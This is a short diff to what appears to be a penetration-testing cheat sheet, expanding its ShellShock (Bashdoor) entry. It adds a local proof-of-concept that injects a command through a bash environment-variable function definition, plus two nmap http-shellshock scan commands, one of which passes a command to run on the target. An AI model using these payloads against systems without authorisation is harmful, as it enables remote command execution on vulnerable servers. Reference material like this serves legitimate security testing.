@@ -85,5 +85,15 @@ nmap --script mycustomscripts,safe example.com
 
 ```
 
-+ ShellShock 
->env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
++ ShellShock==Bashdoor 
+
+```
+# Bashdoor POC
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+#namp NSE ShellShock
+nmap -sV -p- --script http-shellshock <target>
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
+
+```
+
